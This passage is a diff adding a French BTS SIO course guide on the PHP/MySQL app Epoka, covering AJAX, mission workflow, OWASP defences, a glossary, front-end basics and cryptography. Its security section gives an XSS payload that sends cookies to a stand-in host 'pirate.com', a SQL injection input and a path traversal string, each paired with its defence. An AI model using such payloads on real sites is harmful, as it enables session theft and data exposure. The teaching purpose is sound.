+  <div class="fs">MySQL<br>LIKE '%terme%'</div>
+</div>
+<div class="flow">
+  <div class="fs">Dropdown de<br>suggestions affiché</div><div class="fa">←── DOM mis à jour ──</div>
+  <div class="fs">JavaScript<br>parse le JSON</div><div class="fa">←── JSON ──</div>
+  <div class="fs">PHP<br>json_encode()</div>
+</div>
+
+<h2 class="sec">La Fetch API (JavaScript)</h2>
+<pre>
+<span class="c">// async/await : syntaxe moderne pour attendre une réponse asynchrone</span>
+<span class="k">async function</span> <span class="f">checkDistance</span>() {
+    <span class="k">const</span> <span class="v">res</span> = <span class="k">await</span> <span class="f">fetch</span>(<span class="s">'index.php?api=get_distance&id_depart=5&id_arrivee=12'</span>);
+    <span class="c">// await "suspend" l'exécution jusqu'à ce que le serveur réponde</span>
+    <span class="k">const</span> <span class="v">data</span> = <span class="k">await</span> <span class="v">res</span>.<span class="f">json</span>();   <span class="c">// Parse la réponse JSON automatiquement</span>
+
+    <span class="k">if</span> (<span class="v">data</span>.km !== <span class="k">null</span>) {
+        <span class="v">kmInput</span>.value = <span class="v">data</span>.km;         <span class="c">// Pré-remplir le champ</span>
+        <span class="v">kmBadge</span>.style.display = <span class="s">'inline-flex'</span>; <span class="c">// Afficher le badge "Pré-rempli"</span>
+    }
+}
+</pre>
+
+<h2 class="sec">Côté PHP : répondre en JSON</h2>
+<pre>
+<span class="c">// Point d'entrée de l'API dans index.php</span>
+<span class="k">if</span> (<span class="f">isset</span>(<span class="v">$_GET</span>[<span class="s">'api'</span>]) && <span class="v">$_GET</span>[<span class="s">'api'</span>] === <span class="s">'get_distance'</span>) {
+    <span class="f">header</span>(<span class="s">'Content-Type: application/json'</span>);  <span class="c">// Déclarer le type de réponse</span>
+    <span class="v">$idDepart</span>  = (<span class="k">int</span>)(<span class="v">$_GET</span>[<span class="s">'id_depart'</span>]  ?? 0);  <span class="c">// Cast int → protection injection</span>
+    <span class="v">$idArrivee</span> = (<span class="k">int</span>)(<span class="v">$_GET</span>[<span class="s">'id_arrivee'</span>] ?? 0);
+    <span class="v">$dist</span> = <span class="v">$distModel</span>-><span class="f">getDistance</span>(<span class="v">$idDepart</span>, <span class="v">$idArrivee</span>);
+    <span class="f">echo</span> <span class="f">json_encode</span>([<span class="s">'km'</span> => <span class="v">$dist</span> ? (<span class="k">int</span>)<span class="v">$dist</span>[<span class="s">'km'</span>] : <span class="k">null</span>]);
+    <span class="k">exit</span>;
+}
+</pre>
+
+<h2 class="sec">Upload de fichier avec AJAX</h2>
+<pre>
+<span class="c">// JavaScript : envoyer un fichier en AJAX (FormData = multipart/form-data)</span>
+<span class="k">const</span> <span class="v">fd</span> = <span class="k">new</span> <span class="n">FormData</span>();
+<span class="v">fd</span>.<span class="f">append</span>(<span class="s">'avatar'</span>, <span class="v">file</span>);
+<span class="k">const</span> <span class="v">res</span>  = <span class="k">await</span> <span class="f">fetch</span>(<span class="s">'index.php?api=upload_avatar'</span>, { method: <span class="s">'POST'</span>, body: <span class="v">fd</span> });
+<span class="k">const</span> <span class="v">data</span> = <span class="k">await</span> <span class="v">res</span>.<span class="f">json</span>();
+<span class="k">if</span> (<span class="v">data</span>.success) { <span class="v">img</span>.src = <span class="v">data</span>.url; }  <span class="c">// Mettre à jour l'img sans recharger</span>
+</pre>
+
+<h2 class="sec">Événements DOM personnalisés</h2>
+<pre>
+<span class="c">// Émettre un événement personnalisé quand une ville est sélectionnée</span>
+hidden.<span class="f">dispatchEvent</span>(<span class="k">new</span> <span class="n">Event</span>(<span class="s">'ville-selected'</span>, { bubbles: <span class="k">true</span> }));
+
+<span class="c">// Écouter cet événement (depuis le script de gestion des km)</span>
+hiddenDepart.<span class="f">addEventListener</span>(<span class="s">'ville-selected'</span>, checkDistance);
+<span class="c">// → Quand une ville est choisie, vérifier si la distance est connue en BDD</span>
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 12 — FLUX MISSION
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 12 — Flux complet d'une mission</h1>
+
+<h2 class="sec">Cycle de vie et transitions de statut</h2>
+<div class="flow">
+  <div class="fs">Salarié crée<br><small>statut: brouillon</small></div><div class="fa">→</div>
+  <div class="fs green">Responsable valide<br><small>statut: validee</small></div><div class="fa">→</div>
+  <div class="fs orange">Comptabilité paie<br><small>statut: payee</small></div>
+</div>
+
+<p>Les transitions sont sécurisées directement dans le SQL avec une double condition :</p>
+<pre>
+<span class="c">-- Valider : impossible si déjà validée ou payée</span>
+<span class="kw">UPDATE</span> mission <span class="kw">SET</span> statut = <span class="s">'validee'</span>
+<span class="kw">WHERE</span> id = ? <span class="kw">AND</span> statut = <span class="s">'brouillon'</span>;
+
+<span class="c">-- Payer : impossible si en brouillon</span>
+<span class="kw">UPDATE</span> mission <span class="kw">SET</span> statut = <span class="s">'payee'</span>
+<span class="kw">WHERE</span> id = ? <span class="kw">AND</span> statut = <span class="s">'validee'</span>;
+</pre>
+
+<h2 class="sec">Actions disponibles par rôle et statut</h2>
+<table>
+  <tr><th>Statut</th><th>Salarié propriétaire</th><th>Responsable (peut_valider)</th><th>Comptabilité (peut_payer)</th></tr>
+  <tr><td><strong>brouillon</strong></td><td>Voir · Modifier · Supprimer</td><td>Voir · Valider · Supprimer</td><td>Voir</td></tr>
+  <tr><td><strong>validee</strong></td><td>Voir · Supprimer</td><td>Voir</td><td>Voir · Payer · Supprimer</td></tr>
+  <tr><td><strong>payee</strong></td><td>Voir · Supprimer</td><td>Voir</td><td>Voir · Supprimer</td></tr>
+</table>
+
+<h2 class="sec">Calcul des remboursements</h2>
+<table>
+  <tr><th>Composante</th><th>Formule</th><th>Paramètre modifiable</th></tr>
+  <tr><td>Frais kilométriques</td><td>km entre les villes × prix/km</td><td>prix_km (défaut : 0,50 €)</td></tr>
+  <tr><td>Frais d'hébergement</td><td>(date_fin − date_debut) en jours × prix/nuit</td><td>prix_hebergement (défaut : 80,00 €)</td></tr>
+  <tr><td><strong>Total</strong></td><td>frais_km + frais_hébergement</td><td>—</td></tr>
+</table>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 13 — SÉCURITÉ
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 13 — Sécurité web (OWASP)</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<p>L'OWASP (Open Web Application Security Project) publie régulièrement le "Top 10" des vulnérabilités web les plus répandues. Epoka protège contre les principales :</p>
+
+<h2 class="sec">A1 — Injection SQL</h2>
+<div class="warn">
+  <strong>Attaque :</strong> Si l'ID envoyé est <code>1 OR 1=1</code>, une requête non sécurisée <code>"SELECT * FROM salarie WHERE id = $id"</code> deviendrait <code>WHERE id = 1 OR 1=1</code> et retournerait TOUS les salariés.
+</div>
+<div class="ok">
+  <strong>Protection dans Epoka :</strong> Toutes les requêtes avec des données utilisateur utilisent des requêtes préparées PDO avec <code>?</code>. PDO échappe automatiquement les valeurs.
+</div>
+<pre>
+<span class="c">// DANGEREUX (jamais fait dans Epoka) :</span>
+<span class="v">$db</span>-><span class="f">query</span>(<span class="s">"SELECT * FROM salarie WHERE id = </span><span class="v">$id</span><span class="s">"</span>);
+
+<span class="c">// SÉCURISÉ :</span>
+<span class="v">$stmt</span> = <span class="v">$db</span>-><span class="f">prepare</span>(<span class="s">"SELECT * FROM salarie WHERE id = ?"</span>);
+<span class="v">$stmt</span>-><span class="f">execute</span>([<span class="v">$id</span>]);  <span class="c">// PDO échappe $id, quelle que soit sa valeur</span>
+</pre>
+
+<h2 class="sec">A3 — XSS (Cross-Site Scripting)</h2>
+<div class="warn">
+  <strong>Attaque :</strong> Un utilisateur enregistre un intitulé de mission : <code>&lt;script&gt;document.location='http://pirate.com?cookie='+document.cookie&lt;/script&gt;</code>. Sans protection, ce script s'exécuterait dans le navigateur de tous ceux qui voient la liste.
+</div>
+<div class="ok">
+  <strong>Protection dans Epoka :</strong> <code>escape()</code> → <code>htmlspecialchars()</code> est appelé sur toutes les variables affichées.
+</div>
+
+<h2 class="sec">A5 — Contrôle d'accès défaillant (IDOR)</h2>
+<div class="warn">
+  <strong>Attaque IDOR :</strong> L'utilisateur #5 modifie l'URL <code>?action=edit&amp;id=12</code> pour accéder à la mission de l'utilisateur #8.
+</div>
+<div class="ok">
+  <strong>Protection dans Epoka :</strong> Le contrôleur vérifie que <code>$mission['id_salarie'] == $_SESSION['salarie_id']</code> avant tout accès à une ressource d'un autre salarié.
+</div>
+
+<h2 class="sec">A7 — Authentification défaillante</h2>
+<div class="ok">
+  <strong>Protections dans Epoka :</strong>
+  <ul>
+    <li>Mots de passe hashés avec bcrypt (pas de stockage en clair)</li>
+    <li>Message d'erreur générique ("Identifiants incorrects") — ne révèle pas si l'ID ou le mdp est faux</li>
+    <li>Connexion par ID numérique unique (clé primaire) — pas de doublon possible comme avec les noms</li>
+    <li><code>requireLogin()</code> au début de chaque action protégée</li>
+  </ul>
+</div>
+
+<h2 class="sec">Upload de fichier sécurisé</h2>
+<div class="ok">
+  <strong>Protections dans Epoka :</strong>
+  <ul>
+    <li><strong>Validation MIME avec finfo</strong> : lire les octets magiques du fichier — l'extension peut mentir, pas les octets</li>
+    <li><strong>Taille limitée</strong> à 2 Mo</li>
+    <li><strong>Nom de fichier contrôlé</strong> : <code>{id_salarie}.{ext}</code> — impossible de faire du path traversal (<code>../../config.php</code>)</li>
+    <li><strong>Dossier séparé</strong> (<code>assets/img/avatars/</code>) — hors de la portée du code PHP</li>
+  </ul>
+</div>
+
+<h2 class="sec">Tableau récapitulatif de la sécurité</h2>
+<table>
+  <tr><th>Risque OWASP</th><th>Mesure en place</th><th>Où dans le code</th></tr>
+  <tr><td>Injection SQL</td><td>Requêtes préparées PDO</td><td>Tous les modèles</td></tr>
+  <tr><td>XSS</td><td><code>htmlspecialchars()</code> via <code>escape()</code></td><td>Toutes les vues</td></tr>
+  <tr><td>IDOR</td><td>Vérification <code>id_salarie == session</code></td><td>MissionController::edit/delete</td></tr>
+  <tr><td>Auth défaillante</td><td>bcrypt + message générique</td><td>Salarie::authenticate</td></tr>
+  <tr><td>Upload malveillant</td><td>finfo MIME + taille + nom contrôlé</td><td>index.php API upload_avatar</td></tr>
+  <tr><td>Accès non authentifié</td><td><code>requireLogin()</code></td><td>Début de chaque méthode contrôleur</td></tr>
+</table>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 14 — RÉCAP BTS SIO SLAM
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 14 — Récapitulatif des notions BTS SIO SLAM</h1>
+
+<h2 class="sec">Notions de 1ère année <span class="bts-tag bts-1">1ère année</span></h2>
+<table>
+  <tr><th>Notion</th><th>Où dans Epoka</th><th>Exemple concret</th></tr>
+  <tr><td>Modèle Conceptuel de Données (MCD)</td><td>Conception des 6 entités</td><td>Relation MISSION – SALARIÉ – VILLE</td></tr>
+  <tr><td>Modèle Physique de Données (MPD)</td><td><code>epoka_structure.sql</code></td><td>Tables avec PK, FK, types MySQL</td></tr>
+  <tr><td>SQL SELECT / WHERE / ORDER BY</td><td>Tous les modèles (getAll, getById)</td><td><code>SELECT * FROM mission WHERE id = ?</code></td></tr>
+  <tr><td>SQL JOIN (jointures)</td><td><code>Mission::getAll()</code></td><td>JOIN salarie, JOIN ville (×2 avec alias)</td></tr>
+  <tr><td>SQL INSERT / UPDATE / DELETE</td><td><code>Mission::create/update/delete()</code></td><td>CRUD complet</td></tr>
+  <tr><td>Clés primaires et étrangères</td><td>Structure de toutes les tables</td><td>FK <code>id_salarie → salarie.id ON DELETE CASCADE</code></td></tr>
+  <tr><td>Types de données SQL</td><td>Structure des tables</td><td>INT, VARCHAR, DATE, ENUM, DECIMAL, TINYINT</td></tr>
+  <tr><td>HTML5 formulaires</td><td><code>views/missions/form.php</code></td><td>input text, number, date, hidden, select</td></tr>
+  <tr><td>PHP basique</td><td>Toutes les vues</td><td><code>&lt;?= escape($var) ?&gt;</code>, foreach, if/else</td></tr>
+  <tr><td>Protocole HTTP GET/POST</td><td><code>index.php</code>, tous les formulaires</td><td><code>$_GET['page']</code>, <code>$_POST['intitule']</code></td></tr>
+  <tr><td>Architecture client/serveur</td><td>WAMP : navigateur → Apache → PHP → MySQL</td><td>Cycle complet d'une requête</td></tr>
+  <tr><td>CRUD</td><td>Missions, Salariés, Agences, Distances</td><td>Créer · Lire · Modifier · Supprimer</td></tr>
+</table>
+
+<h2 class="sec">Notions de 2ème année <span class="bts-tag bts-2">2ème année</span></h2>
+<table>
+  <tr><th>Notion</th><th>Où dans Epoka</th><th>Exemple concret</th></tr>
+  <tr><td>Programmation Orientée Objet</td><td>Models + Controllers</td><td><code>class Mission { private $db; public function getAll() }</code></td></tr>
+  <tr><td>Encapsulation</td><td>Tous les modèles</td><td><code>private $db</code> — accès uniquement via les méthodes publiques</td></tr>
+  <tr><td>Injection de dépendances</td><td>Constructeurs des classes</td><td><code>new Mission($db)</code> — $db injecté, pas créé dans la classe</td></tr>
+  <tr><td>Pattern MVC</td><td>Architecture complète</td><td>models/ + views/ + controllers/ strictement séparés</td></tr>
+  <tr><td>Pattern Singleton</td><td><code>config/database.php</code></td><td><code>static $db = null</code> — une seule connexion PDO</td></tr>
+  <tr><td>Pattern PRG (Post-Redirect-Get)</td><td>Tous les contrôleurs CRUD</td><td>Après POST réussi → redirect() → page GET</td></tr>
+  <tr><td>PDO et requêtes préparées</td><td>Tous les modèles</td><td><code>prepare("... WHERE id = ?"); execute([$id])</code></td></tr>
+  <tr><td>Sessions PHP</td><td>Authentification</td><td><code>$_SESSION['salarie_id']</code>, <code>session_start()</code></td></tr>
+  <tr><td>Hachage de mots de passe</td><td><code>models/Salarie.php</code></td><td><code>password_hash()</code> / <code>password_verify()</code> — bcrypt</td></tr>
+  <tr><td>Gestion des droits/habilitations</td><td><code>helpers.php</code>, contrôleurs</td><td><code>canValidate()</code>, <code>canPay()</code>, <code>isAdmin()</code></td></tr>
+  <tr><td>API REST / JSON</td><td><code>index.php</code> (3 endpoints)</td><td><code>?api=get_distance</code> → JSON <code>{"km":420}</code></td></tr>
+  <tr><td>AJAX / Fetch API</td><td><code>layout_footer.php</code>, form.php</td><td>Recherche de villes, auto-remplissage km, upload avatar</td></tr>
+  <tr><td>Upload de fichier sécurisé</td><td><code>index.php</code> API upload_avatar</td><td>finfo MIME, taille max, nom contrôlé</td></tr>
+  <tr><td>Sécurité OWASP</td><td>Partout</td><td>Injection SQL, XSS, IDOR, auth défaillante</td></tr>
+  <tr><td>Transactions SQL</td><td><code>config/database.php</code></td><td><code>beginTransaction() / commit() / rollBack()</code> pour l'import des villes</td></tr>
+  <tr><td>Événements DOM personnalisés</td><td><code>layout_footer.php</code></td><td><code>dispatchEvent(new Event('ville-selected'))</code></td></tr>
+</table>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 15 — GLOSSAIRE
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 15 — Glossaire technique</h1>
+
+<table>
+  <tr><th>Terme</th><th>Définition complète</th></tr>
+  <tr><td><strong>MVC</strong></td><td>Modèle-Vue-Contrôleur : pattern d'architecture qui sépare la logique des données (Modèle), l'affichage (Vue) et la coordination (Contrôleur)</td></tr>
+  <tr><td><strong>PDO</strong></td><td>PHP Data Objects : extension PHP pour accéder aux bases de données de manière sécurisée et portable</td></tr>
+  <tr><td><strong>Requête préparée</strong></td><td>Requête SQL avec des marqueurs <code>?</code> que PDO remplace de manière sécurisée, protégeant contre les injections SQL</td></tr>
+  <tr><td><strong>Front Controller</strong></td><td>Pattern où toutes les requêtes passent par un seul point d'entrée (index.php) qui route vers les bons contrôleurs</td></tr>
+  <tr><td><strong>Session PHP</strong></td><td>Mécanisme qui permet de mémoriser des données entre les requêtes HTTP d'un même utilisateur via un cookie et un fichier serveur</td></tr>
+  <tr><td><strong>Flash message</strong></td><td>Message stocké en session, affiché une seule fois puis immédiatement supprimé — permet de passer un message à travers une redirection</td></tr>
+  <tr><td><strong>bcrypt</strong></td><td>Algorithme de hachage de mot de passe conçu pour être lent (résistant à la force brute). Utilisé par <code>password_hash()</code></td></tr>
+  <tr><td><strong>AJAX</strong></td><td>Asynchronous JavaScript And XML : technique pour envoyer des requêtes HTTP depuis JavaScript sans recharger la page</td></tr>
+  <tr><td><strong>Fetch API</strong></td><td>Interface JavaScript native (sans bibliothèque) pour faire des requêtes AJAX, utilisant async/await</td></tr>
+  <tr><td><strong>JSON</strong></td><td>JavaScript Object Notation : format de données textuel léger utilisé pour les échanges entre client et serveur</td></tr>
+  <tr><td><strong>XSS</strong></td><td>Cross-Site Scripting : injection de JavaScript malveillant dans une page via des données non échappées</td></tr>
+  <tr><td><strong>Injection SQL</strong></td><td>Insertion de code SQL dans une requête via des données utilisateur non sécurisées pour manipuler la base</td></tr>
+  <tr><td><strong>IDOR</strong></td><td>Insecure Direct Object Reference : accès non autorisé à la ressource d'un autre utilisateur en modifiant un ID dans l'URL</td></tr>
+  <tr><td><strong>OWASP</strong></td><td>Open Web Application Security Project : organisation qui publie les "Top 10" des vulnérabilités web les plus critiques</td></tr>
+  <tr><td><strong>PRG</strong></td><td>Post-Redirect-Get : après un POST réussi, on redirige en GET pour éviter le re-submit au rafraîchissement</td></tr>
+  <tr><td><strong>Singleton</strong></td><td>Pattern qui garantit qu'une classe n'a qu'une seule instance (ici : une seule connexion PDO par requête HTTP)</td></tr>
+  <tr><td><strong>Injection de dépendance</strong></td><td>Passer les dépendances d'une classe en paramètre plutôt que de les créer à l'intérieur — facilite les tests et la modularité</td></tr>
+  <tr><td><strong>Encapsulation</strong></td><td>Principe POO : cacher les données internes d'une classe avec <code>private</code>, n'exposer que ce qui est nécessaire via des méthodes publiques</td></tr>
+  <tr><td><strong>Clé étrangère (FK)</strong></td><td>Contrainte SQL qui garantit qu'une valeur référence une ligne existante dans une autre table (intégrité référentielle)</td></tr>
+  <tr><td><strong>InnoDB</strong></td><td>Moteur MySQL supportant les clés étrangères et les transactions — obligatoire pour l'intégrité référentielle</td></tr>
+  <tr><td><strong>Transaction SQL</strong></td><td>Groupe de requêtes qui s'exécutent en bloc atomique : soit tout réussit (COMMIT), soit tout est annulé (ROLLBACK)</td></tr>
+  <tr><td><strong>ENUM</strong></td><td>Type MySQL qui n'accepte qu'une liste de valeurs prédéfinies — utilisé pour le statut des missions</td></tr>
+  <tr><td><strong>DSN</strong></td><td>Data Source Name : chaîne de connexion PDO (<code>mysql:host=...;dbname=...;charset=...</code>)</td></tr>
+  <tr><td><strong>finfo</strong></td><td>Extension PHP qui détecte le vrai type MIME d'un fichier en lisant ses octets magiques, indépendamment de l'extension</td></tr>
+  <tr><td><strong>utf8mb4</strong></td><td>Vrai encodage UTF-8 sur 4 octets supportant les emojis — à préférer au <code>utf8</code> MySQL qui est limité à 3 octets</td></tr>
+  <tr><td><strong>MCD</strong></td><td>Modèle Conceptuel de Données : représentation abstraite des entités et de leurs relations, indépendante du SGBD</td></tr>
+  <tr><td><strong>MPD</strong></td><td>Modèle Physique de Données : traduction du MCD en tables SQL avec types, clés et contraintes réels</td></tr>
+  <tr><td><strong>CRUD</strong></td><td>Create, Read, Update, Delete — les 4 opérations de base sur une entité</td></tr>
+  <tr><td><strong>Upsert</strong></td><td>Contraction de "Update or Insert" — insère si inexistant, met à jour si déjà présent</td></tr>
+  <tr><td><strong>async/await</strong></td><td>Syntaxe JavaScript moderne pour écrire du code asynchrone de façon lisible (sans callbacks imbriqués)</td></tr>
+</table>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 16 — HTML5 / CSS3 / JAVASCRIPT
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 16 — HTML5 / CSS3 / JavaScript</h1>
+<span class="bts-tag bts-1">1ère année</span>
+
+<h2 class="sec">HTML5 — Structure d'une page</h2>
+<p>HTML (HyperText Markup Language) décrit la <strong>structure et le contenu</strong> d'une page web. HTML5 introduit des balises sémantiques qui donnent du sens au contenu.</p>
+<pre>
+&lt;!DOCTYPE html&gt;                   <span class="c">&lt;!-- Déclare HTML5 --&gt;</span>
+&lt;html lang="fr"&gt;
+  &lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;        <span class="c">&lt;!-- Encodage des caractères --&gt;</span>
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+    &lt;title&gt;Epoka&lt;/title&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;header&gt;...&lt;/header&gt;          <span class="c">&lt;!-- En-tête de la page --&gt;</span>
+    &lt;nav&gt;...&lt;/nav&gt;                <span class="c">&lt;!-- Navigation principale --&gt;</span>
+    &lt;main&gt;
+      &lt;section&gt;...&lt;/section&gt;     <span class="c">&lt;!-- Section thématique --&gt;</span>
+      &lt;article&gt;...&lt;/article&gt;     <span class="c">&lt;!-- Contenu autonome --&gt;</span>
+      &lt;aside&gt;...&lt;/aside&gt;         <span class="c">&lt;!-- Contenu secondaire / sidebar --&gt;</span>
+    &lt;/main&gt;
+    &lt;footer&gt;...&lt;/footer&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+<h3 class="sub">Formulaires HTML5</h3>
+<pre>
+&lt;form method="POST" action="index.php" enctype="multipart/form-data"&gt;
+  &lt;label for="nom"&gt;Nom :&lt;/label&gt;
+  &lt;input type="text"     id="nom"     name="nom"     required placeholder="Dupont"&gt;
+  &lt;input type="email"    name="email" required&gt;
+  &lt;input type="password" name="mdp"   minlength="8"&gt;
+  &lt;input type="number"   name="km"    min="0" max="9999"&gt;
+  &lt;input type="date"     name="debut"&gt;
+  &lt;input type="file"     name="avatar" accept="image/*"&gt;
+  &lt;input type="hidden"   name="id_ville" value="5"&gt;
+
+  &lt;select name="statut"&gt;
+    &lt;option value="brouillon"&gt;Brouillon&lt;/option&gt;
+    &lt;option value="validee" selected&gt;Validée&lt;/option&gt;
+  &lt;/select&gt;
+
+  &lt;textarea name="description" rows="4"&gt;&lt;/textarea&gt;
+
+  &lt;button type="submit"&gt;Enregistrer&lt;/button&gt;
+&lt;/form&gt;
+</pre>
+
+<h3 class="sub">Tableaux HTML</h3>
+<pre>
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;&lt;th&gt;Nom&lt;/th&gt;&lt;th&gt;Statut&lt;/th&gt;&lt;th&gt;Date&lt;/th&gt;&lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;&lt;td&gt;Formation PHP&lt;/td&gt;&lt;td&gt;Validée&lt;/td&gt;&lt;td&gt;2025-03-10&lt;/td&gt;&lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</pre>
+
+<h2 class="sec">CSS3 — Mise en forme</h2>
+<p>CSS (Cascading Style Sheets) contrôle l'<strong>apparence visuelle</strong> des éléments HTML.</p>
+
+<h3 class="sub">Sélecteurs et cascade</h3>
+<pre>
+/* Sélecteur d'élément */
+p { color: #333; }
+
+/* Sélecteur de classe (le plus utilisé) */
+.btn-primary { background: #0f3460; color: white; }
+
+/* Sélecteur d'ID (unique par page) */
+#nav-sidebar { width: 250px; }
+
+/* Pseudo-classe */
+.btn:hover  { opacity: .85; }          /* survol */
+.btn:focus  { outline: 2px solid blue; }/* focus clavier */
+li:nth-child(odd) { background: #f8f8f8; } /* lignes impaires */
+
+/* Sélecteur d'attribut */
+input[type="email"] { border-color: blue; }
+
+/* Variables CSS */
+:root {
+    --color-primary: #0f3460;
+    --radius: 8px;
+}
+.card { border-radius: var(--radius); background: var(--color-primary); }
+</pre>
+
+<h3 class="sub">Box model</h3>
+<pre>
+.element {
+    width: 300px;
+    height: 150px;
+    padding: 16px;          /* espace intérieur */
+    border: 2px solid #ccc; /* bordure */
+    margin: 24px auto;      /* espace extérieur (auto = centré) */
+    box-sizing: border-box; /* width inclut padding+border (recommandé) */
+}
+</pre>
+
+<h3 class="sub">Flexbox</h3>
+<pre>
+.container {
+    display: flex;
+    flex-direction: row;      /* ou column */
+    justify-content: space-between; /* axe principal */
+    align-items: center;      /* axe croisé */
+    flex-wrap: wrap;          /* retour à la ligne si nécessaire */
+    gap: 1rem;                /* espace entre enfants */
+}
+.enfant { flex: 1; } /* chaque enfant prend une part égale */
+</pre>
+
+<h3 class="sub">Grid</h3>
+<pre>
+.grille {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr); /* 3 colonnes égales */
+    grid-template-columns: 250px 1fr;      /* sidebar fixe + contenu flexible */
+    gap: 1.5rem;
+}
+</pre>
+
+<h3 class="sub">Responsive — Media queries</h3>
+<pre>
+/* Mobile first : styles par défaut pour petits écrans */
+.nav { display: none; }
+
+/* Tablette et plus */
+@media (min-width: 768px) {
+    .nav { display: flex; }
+}
+
+/* Desktop */
+@media (min-width: 1024px) {
+    .sidebar { width: 250px; }
+}
+</pre>
+
+<h3 class="sub">Transitions et animations</h3>
+<pre>
+/* Transition (changement progressif sur un événement) */
+.btn {
+    background: #0f3460;
+    transition: background .3s ease, transform .2s ease;
+}
+.btn:hover { background: #1a4a8a; transform: translateY(-2px); }
+
+/* Animation keyframes */
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to   { opacity: 1; transform: translateY(0); }
+}
+.card { animation: fadeIn .4s ease both; }
+</pre>
+
+<h2 class="sec">JavaScript — Interactivité</h2>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h3 class="sub">Variables et types</h3>
+<pre>
+const NOM = 'Epoka';        // constante (ne change jamais)
+let   compteur = 0;         // variable (peut changer)
+var   ancien   = true;      // ancienne syntaxe (éviter)
+
+// Types primitifs
+let n = 42;           // number
+let s = "bonjour";    // string
+let b = true;         // boolean
+let x = null;         // null (absence intentionnelle)
+let y = undefined;    // undefined (non initialisé)
+
+// Tableau
+const missions = ['formation', 'audit', 'déplacement'];
+missions.push('réunion');
+missions.forEach(m => console.log(m));
+
+// Objet
+const salarie = { id: 5, nom: 'Dupont', prenom: 'Jean' };
+console.log(salarie.nom);      // "Dupont"
+console.log(salarie['nom']);   // idem
+</pre>
+
+<h3 class="sub">Manipulation du DOM</h3>
+<pre>
+// Sélectionner un élément
+const btn     = document.getElementById('btn-valider');
+const input   = document.querySelector('input[name="intitule"]');
+const lignes  = document.querySelectorAll('table tr');  // NodeList
+
+// Modifier le contenu / style
+btn.textContent   = 'Validé !';
+btn.style.display = 'none';
+input.classList.add('error');
+input.classList.remove('error');
+input.classList.toggle('active');
+
+// Créer et insérer un élément
+const div = document.createElement('div');
+div.textContent = 'Nouvelle mission';
+document.body.appendChild(div);
+</pre>
+
+<h3 class="sub">Événements</h3>
+<pre>
+// Clic sur un bouton
+btn.addEventListener('click', function(event) {
+    event.preventDefault();  // stopper le comportement par défaut
+    console.log('cliqué !');
+});
+
+// Saisie dans un champ (déclenché à chaque touche)
+input.addEventListener('input', (e) => {
+    console.log('valeur :', e.target.value);
+});
+
+// Soumission de formulaire
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const fd = new FormData(form);
+    const res = await fetch('index.php?api=save', { method: 'POST', body: fd });
+    const data = await res.json();
+});
+</pre>
+
+<h3 class="sub">LocalStorage</h3>
+<pre>
+// Stocker une préférence dans le navigateur (persiste après fermeture)
+localStorage.setItem('theme', 'dark');
+const theme = localStorage.getItem('theme');  // 'dark'
+localStorage.removeItem('theme');
+
+// Stocker un objet (doit être sérialisé)
+localStorage.setItem('user', JSON.stringify({ id: 5, nom: 'Dupont' }));
+const user = JSON.parse(localStorage.getItem('user'));
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 17 — CRYPTOGRAPHIE
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 17 — Cryptographie et sécurité des échanges</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Chiffrement symétrique</h2>
+<p>La <strong>même clé secrète</strong> est utilisée pour chiffrer et déchiffrer. Rapide, mais le problème est le <em>partage sécurisé</em> de la clé.</p>
+<table>
+  <tr><th>Algorithme</th><th>Taille de clé</th><th>Usage typique</th></tr>
+  <tr><td><strong>AES-128</strong></td><td>128 bits</td><td>Chiffrement de données, TLS</td></tr>
+  <tr><td><strong>AES-256</strong></td><td>256 bits</td><td>Données très sensibles, recommandé</td></tr>
+  <tr><td><strong>DES / 3DES</strong></td><td>56 / 168 bits</td><td>Obsolète — ne plus utiliser</td></tr>
+</table>
+<div class="flow">
+  <div class="fs">Message clair</div><div class="fa">→ AES(clé K) →</div>
+  <div class="fs red">Message chiffré</div><div class="fa">→ AES-déchiffre(clé K) →</div>
+  <div class="fs green">Message clair</div>
+</div>
+
+<h2 class="sec">Chiffrement asymétrique</h2>
+<p>Deux clés liées mathématiquement : <strong>clé publique</strong> (partagée librement) et <strong>clé privée</strong> (secrète). Ce qui est chiffré avec l'une ne peut être déchiffré qu'avec l'autre.</p>
+<table>
+  <tr><th>Algorithme</th><th>Clé</th><th>Usage</th></tr>
+  <tr><td><strong>RSA</strong></td><td>2048–4096 bits</td><td>Échange de clés, signature numérique, TLS</td></tr>
+  <tr><td><strong>ECC</strong></td><td>256–521 bits</td><td>Plus rapide que RSA à sécurité équivalente</td></tr>
+</table>
+<div class="flow">
+  <div class="fs">Message</div><div class="fa">→ chiffre avec clé publique →</div>
+  <div class="fs red">Chiffré</div><div class="fa">→ déchiffre avec clé privée →</div>
+  <div class="fs green">Message</div>
+</div>
+<div class="info">
+  <strong>Analogie :</strong> La clé publique est une boîte aux lettres ouverte à tous. N'importe qui peut y glisser un message (chiffrer). Seul le propriétaire de la clé privée peut l'ouvrir.
+</div>
+
+<h2 class="sec">Fonctions de hachage</h2>
